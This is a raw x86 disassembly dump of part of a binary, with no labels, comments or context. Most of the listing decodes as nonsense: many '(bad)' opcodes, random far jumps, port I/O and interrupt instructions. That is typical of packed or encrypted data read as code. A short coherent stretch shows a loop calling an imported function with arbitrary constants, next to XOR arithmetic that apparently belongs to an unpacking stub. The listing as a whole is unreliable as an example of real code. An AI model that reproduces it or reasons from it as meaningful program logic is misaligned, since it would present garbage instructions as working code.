  4157ce:	sbb    bh,BYTE PTR [ecx]
  4157d0:	mov    esi,0xc4ff54b2
  4157d5:	(bad)  
  4157d6:	enter  0x2bb,0x36
  4157da:	test   DWORD PTR ds:0xbe66738b,ebx
  4157e0:	mov    cl,0x71
  4157e2:	xor    BYTE PTR [ebp+0x10],bh
  4157e5:	jmp    0xb269:0xe805be78
  4157ec:	mov    ebx,?
  4157ee:	aad    0x6b
  4157f0:	push   es
  4157f1:	jns    0x415792
  4157f3:	out    dx,eax
  4157f4:	jg     0x4157ae
  4157f6:	adc    al,BYTE PTR [esi+ecx*4-0x5c8eab9b]
  4157fd:	fwait
  4157fe:	inc    esp
  4157ff:	cmp    al,0x4a
  415801:	push   ds
  415802:	call   0xb9301844
  415807:	inc    ecx
  415808:	mov    ebx,DWORD PTR cs:[ebp+0x62]
  41580c:	dec    edx
  41580d:	xchg   ebp,eax
  41580e:	mov    esi,0x2edde5be
  415813:	jnp    0x4157e7
  415815:	(bad)
  415819:	or     eax,0x93d22074
  41581e:	fwait
  41581f:	push   cs
  415820:	test   esi,0xb5d29df9
  415826:	hlt    
  415827:	jnp    0x4157f5
  415829:	fsubr  st,st(6)
  41582b:	test   DWORD PTR [ebp+0x6d057f72],ecx
  415831:	sahf   
  415832:	inc    esp
  415833:	add    edi,DWORD PTR [ecx]
  415835:	std    
  415836:	loopne 0x41583c
  415838:	lea    edi,[edx+0x24]
  41583b:	pop    ss
  41583c:	add    eax,0x3401a0d8
  415841:	jnp    0x41582f
  415843:	add    BYTE PTR [edi],al
  415845:	cli    
  415846:	and    cl,al
  415848:	scas   al,BYTE PTR es:[edi]
  415849:	aas    
  41584a:	xor    edi,ebp
  41584c:	jl     0x415838
  41584e:	add    edi,0x221f6c86
  415854:	sbb    edi,DWORD PTR cs:[eax+0x0]
  415858:	fbstp  TBYTE PTR [edx]
  41585a:	je     0x415888
  41585c:	xchg   DWORD PTR [eax+eax*2+0x6c4f1079],esp
  415863:	in     eax,dx
  415864:	push   0xffffff9c
  415866:	or     al,0xdd
  415868:	and    al,0x2f
  41586a:	(bad)  
  41586b:	mov    WORD PTR [ebx-0x6b],?
  41586e:	push   ecx
  41586f:	pop    ebp
  415870:	adc    eax,0x93bff428
  415875:	or     eax,0xd65b1f0e
  41587a:	mov    ds:0xdf1bc3bc,eax
  41587f:	or     BYTE PTR [ebp-0x7d3ecc84],cl
  415885:	inc    edi
  415886:	sbb    DWORD PTR [ecx-0x69533da5],edi
  41588c:	retf   0x46e7
  41588f:	mov    eax,ds:0x4a47b4aa
  415894:	add    al,0xca
  415896:	aam    0xd0
  415898:	add    al,0x91
  41589a:	neg    dh
  41589c:	or     al,0xba
  41589e:	bnd jmp 0x4158ed
  4158a1:	ror    bl,cl
  4158a3:	inc    ecx
  4158a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158a5:	repz jb 0x41591e
  4158a8:	sti    
  4158a9:	loope  0x415926
  4158ab:	adc    eax,DWORD PTR [edx-0x35]
  4158ae:	loope  0x4158fa
  4158b0:	add    al,0x91
  4158b2:	pop    edi
  4158b3:	jbe    0x41583b
  4158b5:	scas   eax,DWORD PTR es:[edi]
  4158b6:	ds addr16 pop esi
  4158b9:	pop    esp
  4158ba:	jecxz  0x415852
  4158bc:	jle    0x41592e
  4158be:	sbb    al,0xe1
  4158c0:	(bad)  
  4158c2:	nop
  4158c3:	xor    al,0x3d
  4158c5:	fmul   DWORD PTR fs:[eax-0x62bfdeb4]
  4158cc:	xor    dl,BYTE PTR [ebx-0x57]
  4158cf:	ja     0x4158ea
  4158d1:	in     al,dx
  4158d2:	aam    0x8e
  4158d4:	icebp  
  4158d5:	dec    edi
  4158d6:	loopne 0x41588c
  4158d8:	xor    eax,0xbbf26339
  4158dd:	adc    BYTE PTR [ebp+0x4644dae0],ch
  4158e3:	push   edi
  4158e4:	xor    DWORD PTR [edi],0x6f
  4158e7:	int3   
  4158e8:	adc    DWORD PTR [eax+esi*8+0x16],0x9c110fc
  4158f0:	xchg   esp,eax
  4158f1:	xlat   BYTE PTR ds:[ebx]
  4158f2:	sub    BYTE PTR [eax],cl
  4158f4:	outs   dx,BYTE PTR ds:[esi]
  4158f5:	popf   
  4158f6:	dec    edi
  4158f7:	mov    ds:0x6cc6ef14,eax
  4158fc:	cmp    al,0x33
  4158fe:	nop
  4158ff:	jnp    0x415922
  415901:	aam    0x2e
  415903:	cmp    cl,BYTE PTR [eax]
  415905:	ret    0x7ebe
  415908:	cmp    DWORD PTR [esi+0x271c5d93],edx
  41590e:	shr    BYTE PTR [ecx-0x5b],1
  415911:	xor    BYTE PTR [ecx],ch
  415913:	xchg   DWORD PTR [edx+0x5883b04c],esi
  415919:	test   eax,0xc0a9ce41
  41591e:	(bad)  ds:0x27d6d487
  415924:	jmpw   0xf2f6
  415928:	xor    ah,BYTE PTR [edi]
  41592a:	lds    esi,FWORD PTR [edx-0x43]
  41592d:	or     al,0xe0
  41592f:	xchg   edx,eax
  415930:	xor    ch,BYTE PTR [edx-0x6b]
  415933:	imul   edx,DWORD PTR [eax-0x57c7981e],0x59
  41593a:	mov    dl,0x49
  41593c:	ficom  WORD PTR [edi]
  41593e:	pop    es
  41593f:	shl    BYTE PTR [ebx],0xe8
  415942:	cmp    eax,0x50b3267c
  415947:	xchg   ecx,eax
  415948:	push   esi
  415949:	aad    0x66
  41594b:	add    al,0x88
  41594d:	and    bl,bl
  41594f:	jg     0x415902
  415951:	(bad)  [esi-0x1b]
  415954:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  415956:	repz adc bh,BYTE PTR [eax+0x5c312a0f]
  41595d:	shl    bh,0xbe
  415960:	mov    al,0x42
  415962:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415963:	inc    edx
  415964:	test   DWORD PTR [ecx+edx*1],ecx
  415967:	nop
  415968:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415969:	or     esp,DWORD PTR [edx+0x56]
  41596c:	nop
  41596d:	sbb    cl,ch
  41596f:	mov    edi,0x60f25b3a
  415974:	fild   DWORD PTR [esi-0x7c]
  415977:	and    al,bl
  415979:	pop    edi
  41597a:	and    DWORD PTR [ebp+0x28f12f72],ebx
  415980:	push   esp
  415981:	dec    edi
  415982:	leave  
  415983:	push   ss
  415984:	aam    0x17
  415986:	aas    
  415987:	lods   al,BYTE PTR ds:[esi]
  415988:	das    
  415989:	or     al,0x8c
  41598b:	mov    edi,esi
  41598d:	vpslld xmm5{k7}{z},xmm6,XMMWORD PTR [eax]
  415993:	out    dx,eax
  415994:	sahf   
  415995:	mov    WORD PTR [edx-0x440f8bc5],?
  41599b:	nop
  41599c:	jecxz  0x415a06
  41599e:	mov    ds:0xa395a3d0,al
  4159a3:	sub    eax,0xd7366ca3
  4159a8:	xchg   DWORD PTR [edi+0xf6f4ff6],ebp
  4159ae:	imul   edx,DWORD PTR [ecx-0x53cccee],0x35
  4159b5:	pop    es
  4159b6:	sub    al,BYTE PTR [edx+eax*8+0x7e]
  4159ba:	xlat   BYTE PTR ds:[ebx]
  4159bb:	jmp    0x4159fc
  4159bd:	pop    ebx
  4159be:	adc    esi,DWORD PTR [edi-0x6b]
  4159c1:	in     eax,dx
  4159c2:	push   ecx
  4159c3:	int3   
  4159c4:	mov    eax,0xe70d32ea
  4159c9:	pop    edi
  4159ca:	add    BYTE PTR [ecx+0x6b13975e],0xb2
  4159d1:	fld    TBYTE PTR [esi]
  4159d3:	fwait
  4159d4:	sub    DWORD PTR [eax+0x15],0x181b29e
  4159db:	daa    
  4159dc:	(bad)  
  4159dd:	int    0x48
  4159df:	test   al,0xb5
  4159e1:	cli    
  4159e2:	push   ss
  4159e3:	cmp    DWORD PTR [edx],edi
  4159e5:	inc    esp
  4159e6:	cmp    ebp,DWORD PTR [ecx+ebx*1+0x51fc936]
  4159ed:	xor    BYTE PTR [ebp+0x25482a9c],cl
  4159f3:	jnp    0x4159bd
  4159f5:	mov    BYTE PTR [ebp+0x1d],cl
  4159f8:	adc    ebx,DWORD PTR [ebx+0x65]
  4159fb:	mov    dl,0x47
  4159fd:	int3   
  4159fe:	pop    esi
  4159ff:	dec    edx
  415a00:	mov    ds:0x4abd5e58,eax
  415a05:	lahf   
  415a06:	xchg   esp,eax
  415a07:	iret   
  415a08:	add    al,0xa7
  415a0a:	cli    
  415a0b:	mov    al,ds:0xcbb6d5ef
  415a10:	xchg   esp,eax
  415a11:	adc    edx,DWORD PTR [ebx+0x616dffd5]
  415a17:	sbb    BYTE PTR [ebx-0x9],bh
  415a1a:	dec    esp
  415a1b:	aam    0x8d
  415a1d:	and    eax,0x9404c56b
  415a22:	(bad)  
  415a23:	jge    0x415a90
  415a25:	std    
  415a26:	pop    esp
  415a27:	xchg   edx,eax
  415a28:	or     al,0xa8
  415a2a:	sub    DWORD PTR [esp+ecx*4-0x79],eax
  415a2e:	sbb    ebx,DWORD PTR [eax]
  415a30:	dec    edx
  415a31:	and    eax,0xf40f3dc2
  415a36:	push   ebp
  415a37:	(bad)  
  415a38:	fimul  WORD PTR [edx-0x10]
  415a3b:	scas   eax,DWORD PTR es:[edi]
  415a3c:	xor    esp,edi
  415a3e:	mov    BYTE PTR [edx+0x33],ah
  415a41:	xor    DWORD PTR [edx+0x55c25824],edx
  415a47:	mov    eax,ds:0xf48fa13b
  415a4c:	nop
  415a4d:	in     eax,0xb4
  415a4f:	jnp    0x415aaf
  415a51:	fst    st(6)
  415a53:	mov    eax,DWORD PTR [ecx+edx*1]
  415a56:	fucom  st(3)
  415a58:	lahf   
  415a59:	test   BYTE PTR [edi-0x6],ch
  415a5c:	or     BYTE PTR [ebp-0x51],ah
  415a5f:	dec    esi
  415a60:	shr    esi,0xd7
  415a63:	call   DWORD PTR [ebx+0x1098946e]
  415a69:	jmp    0x42af99ae
  415a6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a6f:	add    edx,DWORD PTR [bx+si]
  415a72:	not    DWORD PTR [esp+ecx*4-0x2d]
  415a76:	push   ss
  415a77:	ficom  DWORD PTR [esi-0x76c68726]
  415a7d:	in     al,dx
  415a7e:	push   edi
  415a7f:	lock adc cl,ah
  415a82:	sbb    esi,0xfd90a5e2
  415a88:	fld    DWORD PTR [esp+edi*8-0x27]
  415a8c:	mov    al,ds:0x2bdcb84d
  415a91:	push   es
  415a92:	mov    ebx,0x89ce4114
  415a97:	jp     0x415abc
  415a99:	ficomp WORD PTR [ecx+0x32]
  415a9c:	bound  ebp,QWORD PTR [edx+0x24]
  415a9f:	inc    esi
  415aa0:	pop    esp
  415aa1:	fadd   DWORD PTR [ebx+0x34]
  415aa4:	in     al,0x2f
  415aa6:	lds    eax,FWORD PTR [ebx+0x7e]
  415aa9:	dec    eax
  415aaa:	sub    eax,0x32d27ca4
  415aaf:	or     ecx,edi
  415ab1:	hlt    
  415ab2:	cmp    eax,0xfac5bfb5
  415ab7:	and    BYTE PTR ds:0x97bf6a61,0x1f
  415abe:	in     al,0x6
  415ac0:	or     bl,BYTE PTR [ecx-0x47775d50]
  415ac6:	push   ecx
  415ac7:	push   0x0
  415ac9:	inc    ecx
  415aca:	mov    cs,WORD PTR [edx-0x21]
  415acd:	cld    
  415ace:	idiv   BYTE PTR [ebx+0x2c]
  415ad1:	loop   0x415aed
  415ad3:	ja     0x415b17
  415ad5:	or     eax,0x39aed393
  415ada:	mov    eax,0x8758e99a
  415adf:	mov    ebx,0x6ea7abd4
  415ae4:	ror    BYTE PTR [ebx+0x7],cl
  415ae7:	mov    eax,0xf318a63c
  415aec:	loop   0x415b33
  415aee:	xchg   BYTE PTR [eax+0x7d],cl
  415af1:	data16 or bh,BYTE PTR [ecx-0x34]
  415af5:	jns    0x415ac9
  415af7:	mov    ds:0xc23da842,eax
  415afc:	retf   
  415afd:	fadd   st(3),st
  415aff:	popa   
  415b00:	jecxz  0x415aad
  415b02:	mov    ds:0xf8679845,eax
  415b07:	xchg   BYTE PTR ds:0xad8e462e,bl
  415b0d:	push   eax
  415b0e:	add    DWORD PTR [esi-0x349707e4],edi
  415b14:	mov    bh,0x38
  415b16:	mov    esi,eax
  415b18:	ret    
  415b19:	(bad)  
  415b1a:	mov    ch,0x64
  415b1c:	int    0x9e
  415b1e:	pushf  
  415b1f:	pop    ds
  415b20:	mov    edx,0xe7fd869a
  415b25:	mov    bl,0x43
  415b27:	mov    DWORD PTR [eax-0x474dcadc],ecx
  415b2d:	pop    ss
  415b2e:	jge    0x415aba
  415b30:	pushf  
  415b31:	clc    
  415b32:	mov    esi,0xb00f3a54
  415b37:	push   eax
  415b38:	mov    edx,DWORD PTR [ebp+0xc]
  415b3b:	xor    edx,esi
  415b3d:	mov    BYTE PTR [edx+eax*1+0x3272db],cl
  415b44:	mov    eax,DWORD PTR [ebp+0xc]
  415b47:	xor    eax,esi
  415b49:	add    eax,edi
  415b4b:	pop    edi
  415b4c:	pop    esi
  415b4d:	pop    ebx
  415b4e:	leave  
  415b4f:	ret    0x8
  415b52:	push   ebp
  415b53:	mov    ebp,esp
  415b55:	push   ecx
  415b56:	and    DWORD PTR ds:0x42701c,0x0
  415b60:	jmp    0x415b70
  415b65:	mov    eax,ds:0x42701c
  415b6a:	inc    eax
  415b6b:	mov    ds:0x42701c,eax
  415b70:	cmp    DWORD PTR ds:0x42701c,0x1b
  415b77:	jae    0x415bbd
  415b7d:	cmp    DWORD PTR ds:0x42701c,0x25
  415b84:	jne    0x415bb8
  415b8a:	push   0x5668
  415b8f:	push   DWORD PTR [ebp-0x24]
  415b92:	push   DWORD PTR [ebp-0x10]
  415b95:	push   DWORD PTR [ebp-0x20]
  415b98:	push   0x7cb6
  415b9d:	push   DWORD PTR [ebp-0x24]
  415ba0:	push   0x559a
  415ba5:	push   0x4b12
  415baa:	push   0x6519
  415baf:	push   DWORD PTR [ebp-0x28]
  415bb2:	call   DWORD PTR ds:0x421030
  415bb8:	jmp    0x415b65
  415bbd:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  415bc4:	adc    DWORD PTR ds:0x428008,ecx
  415bca:	mov    eax,DWORD PTR [ebp+0x8]
  415bcd:	add    DWORD PTR ds:0x425010,0x223f
  415bd7:	jmp    0x417f24
  415bdc:	into   
  415bdd:	or     al,0x6c
  415bdf:	jg     0x415c4d
  415be1:	fild   QWORD PTR [ebp-0x75]
  415be4:	dec    ebx
  415be5:	mov    ebp,0x34b18bc
  415bea:	stc    
  415beb:	cli    
  415bec:	or     eax,0x52626147
  415bf1:	pop    edi
  415bf2:	bound  esp,QWORD PTR [edx+0x70]
  415bf5:	cmc    
  415bf6:	add    cl,BYTE PTR [edi+edi*8]
  415bf9:	fdivr  QWORD PTR [ecx-0x33]
  415bfc:	sbb    BYTE PTR [esi],al
  415bfe:	lock mov ss,WORD PTR [esi+ebx*8-0x6861469d]
  415c06:	adc    eax,0x31a71336
  415c0b:	inc    esp
  415c0c:	or     esi,esp
  415c0e:	sbb    BYTE PTR [edi],dh
  415c10:	jb     0x415bfe
  415c12:	sub    eax,0xeffdc1df
  415c17:	pop    esp
  415c18:	pusha  
  415c19:	xor    ecx,eax
  415c1b:	sub    eax,0x13340724
  415c20:	pop    edx
  415c21:	xor    edx,ecx
  415c23:	jmp    0xd383ab0
  415c28:	dec    esi
  415c29:	pop    esp
  415c2a:	inc    edi
  415c2b:	into   
  415c2c:	shr    BYTE PTR [ecx-0x77],0xa
  415c30:	aas    
  415c31:	add    al,0x5d
  415c33:	je     0x415bf3
  415c35:	xchg   ebp,eax
  415c36:	jno    0x415bc8
  415c38:	iret   
  415c39:	mov    ebp,edx
  415c3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c3c:	push   edx
  415c3d:	push   ebp
  415c3e:	lds    esi,FWORD PTR ds:0xe966fc36
  415c44:	cmc    
  415c45:	repnz cmp ecx,DWORD PTR [eax]
  415c48:	ds in  al,dx
  415c4a:	jp     0x415c34
  415c4c:	dec    eax
  415c4d:	push   ebx
  415c4e:	(bad)  
  415c4f:	fcom   DWORD PTR [esi+ecx*4+0x6e63eb72]
  415c56:	pop    eax
  415c57:	sub    al,0x99
  415c59:	fistp  QWORD PTR [eax-0x40295204]
  415c5f:	mov    eax,ds:0xa432a915
  415c64:	and    bh,dh
  415c66:	cmc    
  415c67:	sbb    DWORD PTR [ebx],ebx
  415c69:	push   ss
  415c6a:	lods   eax,DWORD PTR ds:[esi]
  415c6b:	aaa    
  415c6c:	mov    bl,0xde
  415c6e:	jbe    0x415ca6
  415c70:	rcr    dh,1
  415c72:	jnp    0x415c95
  415c74:	mov    edx,0xefa60264
  415c79:	jbe    0x415c67
  415c7b:	and    edi,DWORD PTR [edi-0x75d2399c]
  415c81:	add    eax,0x10ba6106
  415c86:	fwait
  415c87:	mov    BYTE PTR [ebp+0x41],ch
  415c8a:	int3   
  415c8b:	jmp    DWORD PTR [ecx]
  415c8d:	std    
  415c8e:	test   ah,al
  415c90:	lock dec cx
  415c93:	xchg   esp,eax
  415c94:	test   eax,0x578b0d58
  415c99:	out    dx,al
  415c9a:	jg     0x415c87
  415c9c:	(bad)  
  415c9d:	xor    al,0x48
  415c9f:	pop    ebp
  415ca0:	cmp    BYTE PTR [esi],ah
  415ca2:	pop    es
  415ca3:	stos   DWORD PTR es:[edi],eax
  415ca4:	jp     0x415c90
  415ca6:	sbb    BYTE PTR [esi-0x5d],ah
  415ca9:	sub    esi,DWORD PTR [ebx-0x2d]
  415cac:	hlt    
  415cad:	icebp  
  415cae:	fild   DWORD PTR [esi+0x41]
  415cb1:	jge    0x415cbd
  415cb3:	mov    ch,0xec
  415cb5:	lahf   
  415cb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cb7:	faddp  st(4),st
  415cb9:	push   eax
  415cba:	arpl   cx,bx
  415cbc:	mov    edi,DWORD PTR [esi]
  415cbe:	xchg   ecx,eax
  415cbf:	push   edi
  415cc0:	(bad)  
  415cc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415cc2:	das    
  415cc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415cc4:	jns    0x415cfe
  415cc6:	sbb    eax,0xac37b8
  415ccb:	adc    eax,0x33ae4bc2
  415cd0:	ret    0x50fd
  415cd3:	aas    
  415cd4:	xchg   edi,eax
  415cd5:	adc    al,0x2c
  415cd7:	inc    esp
  415cd8:	aam    0x9
  415cda:	inc    esi
  415cdb:	xor    ah,BYTE PTR [edi-0x626ae89b]
  415ce1:	and    al,0xa
  415ce3:	pop    ebx
  415ce4:	mov    ebp,0xf547918e
  415ce9:	mov    esi,0x8365c31f
  415cee:	popa   
  415cef:	imul   BYTE PTR [esi-0x4023431f]
  415cf5:	loop   0x415d39
  415cf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cf8:	inc    eax
  415cf9:	xor    ebx,eax
  415cfb:	mov    dh,0x3
  415cfd:	ss push ecx
  415cff:	retf   0xdb42
  415d02:	push   0xa432b10c
  415d07:	daa    
  415d08:	push   es
  415d09:	(bad)  
  415d0a:	rcl    DWORD PTR [edi+0x2792fca0],1
  415d10:	mov    dl,0x10
  415d12:	(bad)  
  415d14:	hlt    
  415d15:	mov    bh,BYTE PTR [edi-0x3]
  415d18:	inc    ebx
  415d19:	gs out dx,eax
  415d1b:	pop    ecx
  415d1c:	inc    esi
  415d1d:	sbb    ch,dl
  415d1f:	es retf 0x229a
  415d23:	cmp    al,0x89
  415d25:	inc    ebp
  415d26:	cmp    eax,0xae932d1f
  415d2b:	sti    
  415d2c:	jb     0x415d8d
  415d2e:	in     al,0xf3
  415d30:	push   eax
  415d31:	add    ebp,ecx
  415d33:	out    dx,eax
  415d34:	(bad)  
  415d35:	mov    edi,0x9af2d3e6
  415d3a:	or     dl,dl
  415d3c:	mov    al,ds:0x6eca5c5a
  415d41:	jbe    0x415d21
  415d43:	not    BYTE PTR [esi]
  415d45:	test   al,0x1c
  415d47:	aad    0x96
  415d49:	jbe    0x415dae
  415d4b:	dec    edx
  415d4c:	push   esp
  415d4d:	ret    0x73c
  415d50:	in     eax,0xff
  415d52:	dec    ebx
  415d53:	jle    0x415da8
  415d55:	xchg   DWORD PTR [ebx],ecx
  415d57:	mov    dl,0x35
  415d59:	inc    ecx
  415d5a:	mov    bh,0xf9
  415d5c:	adc    al,bl
  415d5e:	pop    ds
  415d5f:	inc    edi
  415d60:	mov    cs,esp
  415d62:	sbb    eax,0x211a41d0
  415d67:	ficom  DWORD PTR [ecx-0x29a189eb]
  415d6d:	sub    al,0x5e
  415d6f:	sbb    DWORD PTR [eax-0x2be3af7c],ebp
  415d75:	mov    ds:0x74bdba67,eax
  415d7a:	pop    edx
  415d7b:	add    DWORD PTR [eax],ebx
  415d7d:	mov    ?,WORD PTR [ecx+0x22710546]
  415d83:	stos   DWORD PTR es:[edi],eax
  415d84:	cmp    eax,0x83881ec5
  415d89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d8a:	or     BYTE PTR [ebx+0xa],bh
  415d8d:	mov    ebp,0x172d3175
  415d92:	mov    ch,0x32
  415d94:	jb     0x415d91
  415d96:	(bad)  
  415d97:	(bad)  
  415d98:	push   eax
  415d99:	cmp    eax,0x4141c3a5
  415d9e:	xor    DWORD PTR [edx+0x2678242d],ecx
  415da4:	test   DWORD PTR [edi],edx
  415da6:	mov    bh,0xb0
  415da8:	mov    ds:0x4d059569,eax
  415dad:	(bad)  
  415dae:	(bad)  
  415daf:	cmp    eax,0xbcc7f902
  415db4:	mov    dh,BYTE PTR [ebp-0x7129439]
  415dba:	jge    0x415dab
  415dbc:	ret    0xc7a1
  415dbf:	clc    
  415dc0:	jae    0x415d4b
  415dc2:	js     0x415d4b
  415dc4:	push   DWORD PTR [esi]
  415dc6:	in     al,dx
  415dc7:	xlat   BYTE PTR ds:[ebx]
  415dc8:	jnp    0x415d5a
  415dca:	repnz test eax,0x7d1db61f
  415dd0:	inc    edi
  415dd1:	or     eax,0xe18e5bb7
  415dd6:	aas    
  415dd7:	test   BYTE PTR [ebp+0x21],ah
  415dda:	ins    DWORD PTR es:[edi],dx
  415ddb:	iret   
  415ddc:	cmp    al,0x2
  415dde:	retf   0xfff5
  415de1:	push   ecx
  415de2:	jmp    0x415e13
  415de4:	jp     0x415e40
  415de6:	sti    
  415de7:	into   
  415de8:	jnp    0x415d97
  415dea:	inc    ebp
  415deb:	dec    edx
  415dec:	push   edi
  415ded:	sbb    al,0xaf
  415def:	and    DWORD PTR [ebx+0x551a3db1],edx
  415df5:	jl     0x415dc8
  415df7:	mov    edi,0x1ef84d64
  415dfc:	fwait
  415dfd:	sbb    ecx,ebx
  415dff:	cmp    esp,DWORD PTR [eax]
  415e01:	je     0x415e22
  415e03:	jg     0x415e2b
  415e05:	fmul   QWORD PTR [edi]
  415e07:	or     eax,0xd7feb27a
  415e0c:	mov    esp,0xfad396f1
  415e11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e12:	out    0x8b,eax
  415e14:	pop    ds
  415e15:	pop    ecx
  415e16:	sub    al,0xe1
  415e18:	or     al,ah
  415e1a:	mov    ds:0x759d3e1b,al
  415e1f:	lods   eax,DWORD PTR ds:[esi]
  415e20:	outs   dx,BYTE PTR ds:[esi]
  415e21:	shr    esp,1
  415e23:	sub    eax,0xbf18b933
  415e28:	je     0x415dfd
  415e2a:	push   edi
  415e2b:	fiadd  DWORD PTR [esi]
  415e2d:	push   0x38
  415e2f:	fwait
  415e30:	xchg   esp,eax
  415e31:	(bad)  
  415e32:	xor    cl,BYTE PTR [edx+ebp*8+0x61ebe735]
  415e39:	or     cl,0xbe
  415e3c:	pop    ds
  415e3d:	cmp    ecx,DWORD PTR [eax]
  415e3f:	push   0x41
  415e41:	push   0x9730e9cf
  415e46:	or     BYTE PTR [esi+0x22258302],al
  415e4c:	cld    
  415e4d:	sbb    BYTE PTR [ecx],ah
  415e4f:	pop    ebx
  415e50:	pop    ecx
  415e51:	sbb    cl,0x4d
  415e54:	mul    ebx
  415e56:	into   
  415e57:	mov    eax,DWORD PTR [ecx+0x62]
  415e5a:	inc    esi
  415e5b:	pop    ds
  415e5c:	pop    esp
  415e5d:	adc    al,0xe9
  415e5f:	push   ds
  415e60:	xchg   esi,eax
  415e61:	jecxz  0x415de9
  415e63:	pop    ecx
  415e64:	inc    ebp
  415e65:	mov    ds:0xd08c660c,al
  415e6a:	daa    
  415e6b:	dec    ecx
  415e6c:	outs   dx,DWORD PTR ds:[esi]
  415e6d:	xchg   edx,eax
  415e6e:	jle    0x415df3
  415e70:	mov    cl,0xe2
  415e72:	jecxz  0x415e1d
  415e74:	or     ecx,DWORD PTR [esi+eax*2]
  415e77:	mov    ds:0xcaf85853,eax
  415e7c:	mov    edi,0xd442665a
  415e81:	push   cs
  415e82:	bound  ebx,QWORD PTR [ebp+0x64091e7]
  415e88:	(bad)
  415e8c:	sti    
  415e8d:	fdivr  QWORD PTR [esi+0x57540b01]
  415e93:	lea    edi,[ebx+0x790421e9]
  415e99:	sub    eax,0xd4ed9857
  415e9e:	scas   eax,DWORD PTR es:[edi]
  415e9f:	stos   BYTE PTR es:[edi],al
  415ea0:	mov    esi,0xa9d382c0
  415ea5:	rcl    BYTE PTR [esi+0x13696a00],0xf7
  415eac:	cmp    esi,DWORD PTR [ecx+0x7c]
  415eaf:	fstp   DWORD PTR [edi+0x6697c5d6]
  415eb5:	or     DWORD PTR [edi-0xe],ebx
  415eb8:	stos   DWORD PTR es:[edi],eax
  415eb9:	jmp    0x5bb3:0xb33b9084
  415ec0:	sub    eax,0xc0136736
  415ec5:	popf   
  415ec6:	into   
  415ec7:	enter  0x5752,0xac
  415ecb:	add    al,0x8f
  415ecd:	xchg   edx,eax
  415ece:	std    
  415ecf:	fwait
  415ed0:	jmp    0xbc45:0x49e1e1d3
  415ed7:	pushf  
  415ed8:	cmp    eax,0xdd9c44d3
  415edd:	out    0xc5,al
  415edf:	out    0x6f,eax
  415ee1:	enter  0x4a78,0xff
  415ee5:	xchg   ebp,eax
  415ee6:	popf   
  415ee7:	push   ecx
  415ee8:	inc    esp
  415ee9:	push   cs
  415eea:	test   al,0x7a
  415eec:	fdiv   QWORD PTR [eax]
  415eee:	stos   DWORD PTR es:[edi],eax
  415eef:	nop
  415ef0:	int3   
  415ef1:	xor    al,ah
  415ef3:	out    0xcc,eax
  415ef5:	fadd   st(7),st
  415ef7:	cmp    eax,0x1ecc7fec
  415efc:	loope  0x415f34
  415efe:	js     0x415ecc
  415f00:	fistp  WORD PTR [edx]
  415f02:	call   0x29c63e36
  415f07:	or     edi,DWORD PTR [ebx-0x13]
  415f0a:	cmovno esi,ebp
  415f0d:	inc    eax
  415f0e:	pop    ds
  415f0f:	(bad)  
  415f11:	mov    bl,0x5a
  415f13:	jbe    0x415f67
  415f15:	pop    edx
  415f16:	(bad)  
  415f17:	repz inc esp
  415f19:	pop    eax
  415f1a:	(bad)  
  415f1b:	jmp    0x5f92d319
  415f20:	dec    ecx
  415f21:	scas   al,BYTE PTR es:[edi]
  415f22:	jnp    0x415f69
  415f24:	push   eax
  415f25:	dec    eax
  415f26:	shl    BYTE PTR [esp+eax*4+0x51],cl
  415f2a:	mov    al,ds:0x6cc0c6d8
  415f2f:	sub    ch,bh
  415f31:	sti    
  415f32:	std    
  415f33:	mov    eax,0xd8bb7d60
  415f38:	in     al,dx
  415f39:	jp     0x415f64
  415f3b:	fist   WORD PTR [edx+0x69]
  415f3e:	imul   ecx,DWORD PTR [ebp+0x54],0xc2056ae9
  415f45:	xor    ebx,DWORD PTR [edx+edx*8]
  415f48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f49:	sbb    DWORD PTR [ebp+0x41e6d6ed],esi
  415f4f:	dec    edx
  415f50:	in     eax,0xcf
  415f52:	mov    esp,0x736badd6
  415f57:	test   BYTE PTR [ebp-0x1b],cl
  415f5a:	fnstcw WORD PTR [eax+esi*2]
  415f5d:	push   edi
  415f5e:	lds    ebp,FWORD PTR [eax-0x4a]
  415f61:	mov    edi,0xeca74ac4
  415f66:	xor    bh,dh
  415f68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f69:	mov    WORD PTR [edx+0xec364a2],?
  415f6f:	retf   
  415f70:	fild   DWORD PTR [ebx+0x3cee340e]
  415f76:	fmul   QWORD PTR [esi+eiz*2+0x5dce1392]
  415f7d:	sar    BYTE PTR [ebx+0x568fd79a],cl
  415f83:	inc    ecx
  415f84:	pop    esi
  415f85:	enter  0x86d0,0xb0
  415f89:	(bad)  
  415f8a:	fucomp st(5)
  415f8c:	mov    dh,0x48
  415f8e:	or     ebx,DWORD PTR [eax]
  415f90:	fwait
  415f91:	mov    al,ds:0xe8a1ee32
  415f96:	jl     0x416003
  415f98:	clc    
  415f99:	ins    DWORD PTR es:[edi],dx
  415f9a:	(bad)  
  415f9b:	bsf    esi,DWORD PTR cs:[ebp-0x1b]
  415fa0:	inc    eax
  415fa1:	adc    dl,BYTE PTR [esi]
  415fa3:	xchg   ebp,eax
  415fa4:	mov    esi,DWORD PTR [eax+0x7f91056d]
  415faa:	aam    0x29
  415fac:	std    
  415fad:	rol    DWORD PTR [esi+0xa3cc3e4],cl
  415fb3:	imul   BYTE PTR [ebx+0x6]
  415fb6:	fst    DWORD PTR [edx+0x54]
  415fb9:	push   ss
  415fba:	or     DWORD PTR [ecx-0x1e],eax
  415fbd:	xchg   esi,eax
  415fbe:	xchg   esp,eax
  415fbf:	je     0x415ffd
  415fc1:	retf   
  415fc2:	dec    esp
  415fc3:	mov    dl,0x7b
  415fc5:	repnz sahf 
  415fc7:	mov    dh,0xe6
  415fc9:	pop    es
  415fca:	call   0xe5d9:0x5757fc71
